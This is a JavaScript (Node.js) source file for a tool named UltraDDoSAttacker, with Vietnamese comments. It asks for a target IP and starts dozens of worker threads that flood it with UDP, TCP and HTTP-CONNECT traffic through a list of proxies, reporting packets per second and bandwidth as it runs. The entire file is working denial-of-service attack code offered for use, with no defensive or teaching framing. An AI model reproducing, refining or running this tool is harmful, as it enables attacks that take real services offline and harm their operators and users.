const dgram = require('dgram');
const net = require('net');
const fs = require('fs');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

class UltraDDoSAttacker {
    constructor() {
        this.proxies = [];
        this.targetIp = '';
        this.targetPorts = [80, 443, 53, 8080, 8443];
        this.workers = 50; // Worker threads
        this.threadsPerWorker = 100; // Sockets per worker
        this.running = false;
        this.stats = {
            packetsSent: 0,
            bytesSent: 0,
            startTime: Date.now()
        };
        this.loadProxies();
    }

    loadProxies() {
        try {
            const data = fs.readFileSync('proxy.txt', 'utf8');
            this.proxies = data.split('\n')
                .filter(line => line.trim())
                .map(line => {
                    const [ip, port] = line.trim().split(':');
                    return { ip, port: parseInt(port) };
                });
            
            console.log(`[+] Loaded ${this.proxies.length} proxies - NO TESTING`);
        } catch (error) {
            console.log('[-] Error loading proxies:', error.message);
            process.exit(1);
        }
    }

    getRandomProxy() {
        return this.proxies[Math.floor(Math.random() * this.proxies.length)];
    }

    getRandomPort() {
        return this.targetPorts[Math.floor(Math.random() * this.targetPorts.length)];
    }

    createUDPFlooder() {
        // UDP Flood - PPS CỰC CAO
        const socket = dgram.createSocket('udp4');
        let localStats = { packets: 0, bytes: 0 };

        const sendPacket = () => {
            if (!this.running) return;

            const proxy = this.getRandomProxy();
            const targetPort = this.getRandomPort();
            
            // Tạo packet lớn 64KB - MAX UDP SIZE
            const packetSize = Math.floor(Math.random() * 20000) + 1000; // 1KB - 20KB
            const payload = Buffer.alloc(packetSize, 0xFF); // Fill với data
            
            try {
                socket.send(payload, proxy.port, proxy.ip, (err) => {
                    if (!err) {
                        localStats.packets++;
                        localStats.bytes += packetSize;
                    }
                });
            } catch (err) {}

            // Gửi liên tục không delay
            setImmediate(sendPacket);
        };

        sendPacket();

        // Return stats getter
        return () => ({ ...localStats, packets: localStats.packets, bytes: localStats.bytes });
    }

    createTCPFlooder() {
        // TCP Flood - KẾT NỐI Ồ ẠT
        let localStats = { packets: 0, bytes: 0 };

        const createConnection = () => {
            if (!this.running) return;

            const proxy = this.getRandomProxy();
            
            const socket = new net.Socket();
            socket.setTimeout(5000);
            
            socket.on('connect', () => {
                localStats.packets++;
                
                // Gửi data lớn ngay khi kết nối
                const dataSize = Math.floor(Math.random() * 10000) + 1000;
                const payload = Buffer.alloc(dataSize, 0xAA);
                
                for (let i = 0; i < 50; i++) {
                    try {
                        socket.write(payload);
                        localStats.bytes += dataSize;
                    } catch (err) {}
                }
                
                // Đóng và tạo kết nối mới ngay
                socket.destroy();
                setImmediate(createConnection);
            });

            socket.on('error', () => {
                socket.destroy();
                setImmediate(createConnection);
            });

            socket.on('timeout', () => {
                socket.destroy();
                setImmediate(createConnection);
            });

            try {
                socket.connect(proxy.port, proxy.ip);
            } catch (err) {
                setImmediate(createConnection);
            }
        };

        // Khởi chạy nhiều kết nối đồng thời
        for (let i = 0; i < 10; i++) {
            setImmediate(createConnection);
        }

        return () => ({ ...localStats });
    }

    createHTTPFlooder() {
        // HTTP Flood qua proxy
        let localStats = { packets: 0, bytes: 0 };

        const sendRequest = () => {
            if (!this.running) return;

            const proxy = this.getRandomProxy();
            const targetPort = this.getRandomPort();
            
            const socket = new net.Socket();
            socket.setTimeout(3000);

            socket.on('connect', () => {
                // Gửi HTTP CONNECT request
                const connectMsg = `CONNECT ${this.targetIp}:${targetPort} HTTP/1.1\r\nHost: ${this.targetIp}\r\n\r\n`;
                socket.write(connectMsg);
                localStats.bytes += connectMsg.length;

                socket.once('data', (data) => {
                    if (data.includes('200') || data.includes('Connection established')) {
                        localStats.packets++;
                        
                        // Gửi HTTP GET với headers lớn
                        const headers = [];
                        for (let i = 0; i < 100; i++) {
                            headers.push(`X-Custom-${i}: ${Buffer.alloc(100, 0xBB).toString()}`);
                        }
                        const getMsg = `GET / HTTP/1.1\r\nHost: ${this.targetIp}\r\n${headers.join('\r\n')}\r\n\r\n`;
                        socket.write(getMsg);
                        localStats.bytes += getMsg.length;
                    }
                    
                    socket.destroy();
                    setImmediate(sendRequest);
                });
            });

            socket.on('error', () => {
                socket.destroy();
                setImmediate(sendRequest);
            });

            socket.on('timeout', () => {
                socket.destroy();
                setImmediate(sendRequest);
            });

            try {
                socket.connect(proxy.port, proxy.ip);
            } catch (err) {
                setImmediate(sendRequest);
            }
        };

        for (let i = 0; i < 5; i++) {
            setImmediate(sendRequest);
        }

        return () => ({ ...localStats });
    }

    startWorker() {
        // Mỗi worker chạy nhiều flooders
        const flooders = [];
        
        // UDP Flooders - PPS cao nhất
        for (let i = 0; i < this.threadsPerWorker * 0.6; i++) {
            flooders.push(this.createUDPFlooder());
        }
        
        // TCP Flooders
        for (let i = 0; i < this.threadsPerWorker * 0.3; i++) {
            flooders.push(this.createTCPFlooder());
        }
        
        // HTTP Flooders
        for (let i = 0; i < this.threadsPerWorker * 0.1; i++) {
            flooders.push(this.createHTTPFlooder());
        }

        // Gửi stats về main thread
        setInterval(() => {
            const workerStats = flooders.reduce((acc, getStats) => {
                const stats = getStats();
                acc.packets += stats.packets;
                acc.bytes += stats.bytes;
                return acc;
            }, { packets: 0, bytes: 0 });

            parentPort.postMessage(workerStats);
        }, 1000);
    }

    async startAttack() {
        console.log(`[+] TARGET: ${this.targetIp}`);
        console.log(`[+] PORTS: ${this.targetPorts.join(', ')}`);
        console.log(`[+] PROXIES: ${this.proxies.length}`);
        console.log(`[+] WORKERS: ${this.workers}`);
        console.log(`[+] THREADS PER WORKER: ${this.threadsPerWorker}`);
        console.log(`[+] TOTAL SOCKETS: ${this.workers * this.threadsPerWorker}`);
        console.log(`[+] STRATEGY: MAX PPS + LARGE PACKETS`);
        console.log('[+] Press Ctrl+C to stop\n');

        this.running = true;
        this.stats.startTime = Date.now();

        // Khởi chạy workers
        const workers = [];
        for (let i = 0; i < this.workers; i++) {
            const worker = new Worker(__filename, {
                workerData: { 
                    targetIp: this.targetIp,
                    targetPorts: this.targetPorts,
                    proxies: this.proxies 
                }
            });
            
            worker.on('message', (workerStats) => {
                this.stats.packetsSent += workerStats.packets;
                this.stats.bytesSent += workerStats.bytes;
            });
            
            workers.push(worker);
        }

        // Hiển thị stats real-time
        let lastPackets = 0;
        let lastBytes = 0;
        let lastTime = Date.now();

        const displayStats = () => {
            if (!this.running) return;

            const now = Date.now();
            const timeDiff = (now - lastTime) / 1000;
            
            if (timeDiff > 0) {
                const packetsDiff = this.stats.packetsSent - lastPackets;
                const bytesDiff = this.stats.bytesSent - lastBytes;
                
                const pps = packetsDiff / timeDiff;
                const bps = bytesDiff * 8 / timeDiff;
                const mbps = bps / 1000000;
                const gbps = bps / 1000000000;
                
                const elapsed = (now - this.stats.startTime) / 1000;
                
                process.stdout.write(
                    `\r[STATS] Time: ${elapsed.toFixed(1)}s | ` +
                    `Packets: ${this.stats.packetsSent.toLocaleString()} | ` +
                    `PPS: ${pps.toLocaleString('en-US', { maximumFractionDigits: 0 })} | ` +
                    `BW: ${gbps.toFixed(2)} Gbps / ${mbps.toFixed(2)} Mbps | ` +
                    `Data: ${(this.stats.bytesSent / 1000000000).toFixed(2)} GB`
                );
            }
            
            lastPackets = this.stats.packetsSent;
            lastBytes = this.stats.bytesSent;
            lastTime = now;
            
            setTimeout(displayStats, 1000);
        };

        displayStats();

        // Xử lý shutdown
        process.on('SIGINT', () => {
            this.stopAttack(workers);
        });
    }

    stopAttack(workers) {
        console.log('\n\n[+] Stopping attack...');
        this.running = false;
        
        workers.forEach(worker => {
            worker.terminate();
        });
        
        const totalTime = (Date.now() - this.stats.startTime) / 1000;
        const totalGB = this.stats.bytesSent / 1000000000;
        const avgGbps = (this.stats.bytesSent * 8) / totalTime / 1000000000;
        
        console.log('[+] FINAL STATS:');
        console.log(`    Total Time: ${totalTime.toFixed(1)}s`);
        console.log(`    Total Packets: ${this.stats.packetsSent.toLocaleString()}`);
        console.log(`    Total Data: ${totalGB.toFixed(2)} GB`);
        console.log(`    Average BW: ${avgGbps.toFixed(2)} Gbps`);
        console.log(`    Peak PPS: ${(this.stats.packetsSent / totalTime).toLocaleString('en-US', { maximumFractionDigits: 0 })}`);
    }

    getTargetInfo() {
        const readline = require('readline').createInterface({
            input: process.stdin,
            output: process.stdout
        });

        return new Promise((resolve) => {
            readline.question('[+] Target IP: ', (ip) => {
                this.targetIp = ip.trim();
                
                readline.question('[+] Threads per worker (default 100): ', (threads) => {
                    this.threadsPerWorker = threads ? parseInt(threads) : 100;
                    
                    readline.question('[+] Workers (default 50): ', (workers) => {
                        this.workers = workers ? parseInt(workers) : 50;
                        readline.close();
                        resolve();
                    });
                });
            });
        });
    }
}

// Worker thread
if (!isMainThread) {
    const attacker = new UltraDDoSAttacker();
    attacker.targetIp = workerData.targetIp;
    attacker.targetPorts = workerData.targetPorts;
    attacker.proxies = workerData.proxies;
    attacker.running = true;
    attacker.startWorker();
}

// Main thread
if (isMainThread) {
    const attacker = new UltraDDoSAttacker();
    
    attacker.getTargetInfo().then(() => {
        attacker.startAttack();
    }).catch(console.error);
}